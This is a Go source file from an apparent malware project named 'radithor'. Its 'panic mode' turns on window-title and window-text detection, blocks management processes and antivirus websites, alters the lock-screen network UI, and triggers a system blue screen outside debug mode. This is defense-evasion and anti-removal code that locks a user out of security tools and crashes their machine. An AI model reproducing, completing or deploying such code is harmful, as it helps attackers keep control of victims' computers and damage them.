package lockdown

import (
	"errors"

	"radithor/funcs"
	"radithor/store"

	"golang.org/x/sys/windows"
)

const (
	_WM_USER uint32 = 0x0400
	_WM_QUIT uint32 = 0x0012
)

var NotInPanicModeErr = errors.New("panic mode already disabled")

// todo, make the errors or wtv do something
func EnablePanicMode() error {
	err := DisablePanicMode()
	if err != nil && !errors.Is(err, NotInPanicModeErr) {
		return err
	}

	store.InPanicMode = true

	EnableWindowTitleDetection()
	BlockManagementProcs()
	BlockAntiVirusSites()
	EnableControlCenterDetection()
	EnableWindowTextChangeDetection()
	RemoveLockScreenNetworkUi()

	return nil
}

func DisablePanicMode() error {
	if !store.InPanicMode {
		return NotInPanicModeErr
	}

	store.InPanicMode = false

	DisableWindowTitleDetection()
	UnblockManagementProcs()
	UnblockAntiVirusSites()
	DisableControlCenterDetection()
	DisableWindowTextChangeDetection()
	RemoveLockScreenNetworkUi()

	return nil
}

func panicModeCallback() {
	if store.DEBUG_MODE_ENABLED {
		windows.MessageBox(
			windows.HWND(uintptr(0)),
			windows.StringToUTF16Ptr("panic mode callback triggered\nthis would trigger a bsod when not in debug mode"),
			windows.StringToUTF16Ptr("radithor debug mode"),
			windows.MB_OK|windows.MB_ICONINFORMATION,
		)

		return
	}

	funcs.TriggerBlueScreen()
}
